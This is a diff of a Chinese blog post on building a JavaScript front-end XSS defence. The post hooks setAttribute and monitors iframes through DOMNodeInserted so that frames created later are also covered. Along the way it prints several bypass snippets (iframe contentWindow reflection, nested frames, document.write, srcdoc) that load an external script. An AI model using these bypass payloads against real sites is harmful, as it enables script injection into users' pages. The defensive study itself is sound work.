@@ -227,7 +227,7 @@ Object.defineProperty(Function.prototype, 'call', {
 马上看看效果：
 
 ```js
-Function.prototype.call = function(fn) {
+Function.prototype.call = function() {
 	alert('hello');
 };
 console.log(Function.prototype.call);
@@ -252,7 +252,7 @@ function call() { [native code] }
 
 别高兴的太早，真正的难题还在后面呢。
 
-既然人家想破解你的程序，是会用尽各种手段的，并不局限于纯脚本。因为这是在网页里，攻击者们还可以呼唤出各种变幻莫测的浏览器功能，来躲避我们。
+既然人家想破解，是会用尽各种手段的，并不局限于纯脚本。因为这是在网页里，攻击者们还可以呼唤出各种变幻莫测的浏览器功能，来躲避我们。
 
 最简单的，就是创建一个框架页面，然后通过 contentWindow 即可获得一个全新的环境：
 
@@ -272,7 +272,217 @@ document.body.appendChild(el);
 
 这时，我们的钩子程序就被瞬间秒杀了。
 
-因此，我们还得借助之前讨论的节点挂载事件，将新出现的框架页也进行防护，做到天衣无缝。
+尽管同源页面之间是可以相互访问，但其所在的环境却是隔离的。子页面所有的一切都是独立的副本，完全不受主页面影响。
 
-明天接着讨论。
+不过，既然能够访问子页面，显然也能给它们的环境安装上钩子。每当有新的框架元素出现时，我们就立即对其注入防护程序，让用户获取到的 contentWindow 已是带有钩子的。
+
+类似传统的应用程序，每当调用其他程序时，安全软件需将新创建的进程加以防护。
+
+你说会这很容易办到。将 createElement 方法勾住，然后在里面判断创建的是不是框架元素，如果是的话就直接防护子页面，不就可以了吗？
+
+显然，这是经不起实践的。事实上，只要测试下你就会发现，未挂载到主节点的框架元素，contentWindow 始终是 null。也就是说，必须在调用 appendChild 之后才开始初始化子页面。
+
+因此，我们得借助之前研究的节点挂载事件，找到一个能在 appendChild 之后，但在用户获取 contentWindow 之前触发的事件。
+
+```js
+var observer = new MutationObserver(function(mutations) {
+	console.log('MutationObserver:', mutations);
+});
+observer.observe(document, {
+	subtree: true,
+	childList: true
+});
+
+document.addEventListener('DOMNodeInserted', function(e) {
+	console.log('DOMNodeInserted:', e);
+}, true);
+
+
+// 反射出纯净的接口
+var frm = document.createElement('iframe');
+
+console.warn('begin');
+document.body.appendChild(frm);
+console.warn('end');
+
+var raw_fn = frm.contentWindow.Element.prototype.setAttribute;
+
+/** 输出
+begin
+DOMNodeInserted  MutationEvent
+end
+MutationObserver:  Array[1]
+MutationObserver:  Array[1]
+*/
+```
+[Run](http://jsfiddle.net/zjcqoo/Lm2su/)
+
+这不，DOMNodeInserted 就能满足我们的需求。于是，我们使用它来监控框架元素。
+
+一旦发现有框架挂载到主节点上，我们赶紧把它的接口也装上钩子：
+
+```js
+// 我们防御系统
+(function() {
+	function installHook(window) {
+		// 保存上级接口
+		var raw_fn = window.Element.prototype.setAttribute;
+
+		// 勾住当前接口
+		window.Element.prototype.setAttribute = function(name, value) {
+			// 试试
+			alert(name);
+
+			// 向上调用
+			raw_fn.apply(this, arguments);
+		};
+	}
+	// 先保护当前页面
+	installHook(window);
+
+	document.addEventListener('DOMNodeInserted', function(e) {
+		var element = e.target;
+
+		// 给框架里环境也装个钩子
+		if (element.tagName == 'IFRAME') {
+			installHook(element.contentWindow);
+		}
+	}, true);
+})();
+
+
+// 反射出纯净的接口
+var frm = document.createElement('iframe');
+document.body.appendChild(frm);
+var raw_fn = frm.contentWindow.Element.prototype.setAttribute;
+
+// 创建脚本
+var el = document.createElement('script');
+raw_fn.call(el, 'SRC', 'http://www.etherdream.com/xss/alert.js');
+document.body.appendChild(el);
+```
+[Run](http://jsfiddle.net/zjcqoo/LHznC/)
+
+
+完美！对话框成功弹出来了！即使从框架页里反射出新环境，仍然带有我们的钩子程序。
+
+不过，貌似还漏了些什么。要是从框架页里再套框架页，我们就杯具了：
+
+```js
+// 创建框架页
+var frm = document.createElement('iframe');
+document.body.appendChild(frm);
+
+// 创建框架页的框架页
+var doc = frm.contentDocument;
+var frm2 = doc.createElement('iframe');
+doc.body.appendChild(frm2);
+
+// 反射接口
+var raw_fn = frm2.contentWindow.Element.prototype.setAttribute;
+
+// 创建脚本
+var el = document.createElement('script');
+raw_fn.call(el, 'SRC', 'http://www.etherdream.com/xss/alert.js');
+document.body.appendChild(el);
+```
+[Run](http://jsfiddle.net/zjcqoo/MGBVP/)
+
+<div class="post-img"><img src="/img/xss-frontend-firewall-3/frame_nest.png" style="max-width:840px;" /></div>
+
+前面说了，每个页面环境是独立的，主页面是捕捉不到子页面里的事件的。所以，框架页里创建元素，我们完全不知道。
+
+怎么破？这还不简单，索性给框架页也绑上 DOMNodeInserted 事件，不就可以层层监控了吗。无论框架的几次方，都逃不过我们的火眼金睛了。
+
+```js
+// 我们防御系统
+(function() {
+	function installHook(window) {
+		// 保存上级接口
+		var raw_fn = window.Element.prototype.setAttribute;
+
+		// 勾住当前接口
+		window.Element.prototype.setAttribute = function(name, value) {
+			// 试试
+			alert(name);
+
+			// 向上调用
+			raw_fn.apply(this, arguments);
+		};
+
+		// 监控当前环境的元素
+		window.document.addEventListener('DOMNodeInserted', function(e) {
+			var element = e.target;
+
+			// 给框架里环境也装个钩子
+			if (element.tagName == 'IFRAME') {
+				installHook(element.contentWindow);
+			}
+		}, true);
+	}
+
+	// 先保护当前页面
+	installHook(window);
+})();
+```
+[Run](http://jsfiddle.net/zjcqoo/FbZdv/)
+
+只需简单的小改动。我们把 DOMNodeInserted 放到 installHook 里，这样在安装钩子的同时，也对元素进行监控。一旦出现框架元素，就递归防护。
+
+现在，我们对框架页的监控已是天衣无缝了。
+
+
+## 新页面执行
+
+不过，世上没有绝对的事。
+
+我们只考虑了正向的反射，却忘了框架也可以逆向控制主页面。攻击者要是能把 XSS 代码注入到框架页里，同样也可以向上修改主页面里的内容，发起信任攻击。
+
+在框架里引入脚本，方法就更多了。框架元素虽然是动态创建的，但其内容可以静态呈现：
+
+```js
+// 创建框架页
+var frm = document.createElement('iframe');
+document.body.appendChild(frm);
+
+// 静态呈现
+frm.contentDocument.write('<\script src=http://www.etherdream.com/xss/alert.js><\/script>');
+```
+[Run](http://jsfiddle.net/zjcqoo/FbZdv/)
+
+
+这只是随便列举了一种。事实上，HTML5 还新增一个可以直接控制框架页内容的属性：srcdoc。
+
+```html
+<iframe srcdoc="<script src=http://www.etherdream.com/xss/alert.js></script>"></iframe>
+```
+[Run](http://jsfiddle.net/zjcqoo/PH94h/)
+
+并且还是在同源环境中执行的：
+
+```html
+<iframe srcdoc="<script src=http://www.etherdream.com/xss/alert.js></script>"></iframe>
+```
+[Run](http://jsfiddle.net/zjcqoo/a25fx/)
+
+
+搞了半天结果还是能被绕过。
+
+不过别灰心，经测试，document.write 出来的内容是可以被 MutationObserver 捕获到的。至于 srcdoc 嘛，这个偏门的属性完全可以把它禁掉，或者重写访问器，把 HTML 内容用其他办法代理到页面上去。反正这又不是主流的用法，只要最终效果一样就没问题了。
+
+当然，要是在主页面里 document.write 怎么办？脚本确实能运行，但不白屏了吗。如果觉得这有风险，可以在 DOMContentLoaded 之后，把 document.write 也屏蔽掉，以免后患。
+
+
+## 后记
+
+虽说魔高一尺道高一丈，但再牢固的钩子还是有意想不到的办法绕过的。因此我们得与时俱进，不断修缮来强化防御能力。
+
+到目前为止，我们已对脚本、框架、API 接口实现了主动防御。但是，具备执行能力的元素并不止这些。
+
+例如 Flash 就可以运行页面中的脚本，光是它就占用了 object，embed，param 那么多元素。
+
+而且，API 防护钩子并不全面，只是例举了几个常用的。
+
+下一篇，我们将详细的整理需要防护的监控点，实现全方位的防护。
+
 
